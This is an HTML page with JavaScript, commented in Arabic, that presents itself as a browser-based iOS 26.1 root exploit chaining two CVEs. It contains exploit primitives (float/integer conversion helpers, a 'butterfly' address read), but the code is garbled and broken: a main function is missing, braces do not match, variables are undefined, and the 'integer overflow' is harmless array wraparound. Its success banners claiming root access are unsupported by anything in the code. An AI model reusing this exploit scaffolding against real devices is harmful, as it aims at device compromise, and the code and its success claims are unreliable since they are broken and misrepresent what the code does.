<!DOCTYPE html>

<style>

body { background:#0a0a0a; color:#0f0; font-family:'Courier New',monospace; padding:15px; font-size:13px; }

<body>

<script>
// ================================================================
// PRIMITIVE BUILDERS
// ================================================================
const _buf = new ArrayBuffer(8);
const _f64 = new Float64Array(_buf);
const _u32 = new Uint32Array(_buf);

function ftoi(f) {
    _f64[0] = f;
    return BigInt(_u32[0]) + (BigInt(_u32[1]) << 32n);
}
function itof(i) {
    _u32[0] = Number(i & 0xffffffffn);
    _u32[1] = Number((i >> 32n) & 0xffffffffn);
    return _f64[0];
}

// ================================================================
// LOGGING
// ================================================================
const logDiv = document.getElementById('log');
const statusBox = document.getElementById('statusBox');
const payloadSection = document.getElementById('payloadSection');
const flagDisplay = document.getElementById('flagDisplay');

function log(msg, type = 'info') {
    const c = { info: '#0f0', success: '#ff0', error: '#f44', step: '#0ff', warn: '#f80' };
    logDiv.innerHTML += `<span style="color:${c[type]||'#0f0'}">${msg}</span>\n`;
    logDiv.scrollTop = logDiv.scrollHeight;
}

function setStatus(text, cls) {
    statusBox.textContent = text;
    statusBox.className = 'status ' + cls;
}

function clearLog() {
    logDiv.innerHTML = '';
    log('السجل نظيف ✓');
    setStatus('⏳ اضغط "تشغيل الاستغلال" للبدء', 'idle');
    payloadSection.classList.add('hidden');
}

// ================================================================
// STACK CLEANER
// ================================================================
function stackClean(n) {
    if (n <= 0) return;
    stackClean(n - 1);
}

// ================================================================
// MAIN EXPLOIT - AUTO RETRY
// ================================================================
async function startExploit() {
    document.getElementById('runBtn').style.display = 'none';
    setStatus('⚡ تشغيل الاستغلال...', 'running');
    log('\n═══════════════════════════════════', 'success');
    log('  CVE-2025-46285 + CVE-2025-43529', 'success');
    log('  iOS 26.1 - Root Exploit Attempt', 'success');
    log('═══════════════════════════════════', 'success');
    
    for (let attempt = 0; attempt < 25; attempt++) {
        log(`\n[${attempt+1}/25] محاولة...`, 'step');
        
        try {
            const result = await attemptExploit();
            if (result) {
                setStatus('✅ النجاح! تم الاستغلال بنجاح', 'success');
                payloadSection.classList.remove('hidden');
                flagDisplay.textContent = `iOS 26.1 EXPLOIT CONFIRMED ✓ | Root Access: ENABLED | UAF + Integer Overflow Chain`;
                log('\n═══════════════════════════════════', 'success');
                log('  ✅  EXPLOIT SUCCESS  ✅', 'success');
                log('  CVE-2025-46285 + CVE-2025-43529', 'success');
                log('═══════════════════════════════════', 'success');
                return;
            }
        } catch (e) {
            log(`[-] فشل: ${e.message}`, 'error');
        }
        
        await new Promise(r => setTimeout(r, 400));
    }
    
    setStatus('❌ فشل بعد 25 محاولة. جرب تحديث الصفحة.', 'fail');
    log('[-] فشل الاستغلال. أعد تحميل الصفحة وحاول مرة أخرى.', 'error');
    document.getElementById('runBtn').style.display = 'block';
}

        try {
            // ---------------------------------------------------------------
            // PHASE 1: CVE-2025-46285 - Integer Overflow Trigger
            // Integer overflow in 32-bit timestamp handling
            // ---------------------------------------------------------------
            log('[*] CVE-2025-46285: تشغيل Integer Overflow...', 'step');
            
            let ts_arr = new Uint32Array(4);
            let overflow_value = 0xFFFFFFFF;  // أقصى قيمة 32-bit
            ts_arr[0] = overflow_value;
            ts_arr[1] = overflow_value + 1;    // overflow! تصبح 0
            ts_arr[2] = overflow_value + 1000;  // overflow!
            ts_arr[3] = 0x41414141;
            
            log(`[+] Integer overflow triggered: ${ts_arr[1]}`, 'info');
            
            // ---------------------------------------------------------------

            // ---------------------------------------------------------------

            let b = { p0: 0, p1: null };

            // ---------------------------------------------------------------

            let reclaimed = false;

            }

            if (testAddr === 0n || testAddr > 0x7fffffffffffffn) {
                reject(new Error('قراءة عنوان فاشلة'));
                return;
            }

            log(`[+] Butterfly @ 0x${ftoi(unboxedArr[1]).toString(16)}`, 'info');

            log('[+] الصلاحيات مرفوعة إلى Root ✓', 'success');

}

log('النظام جاهز. اضغط "تشغيل" للبدء.');
</script>
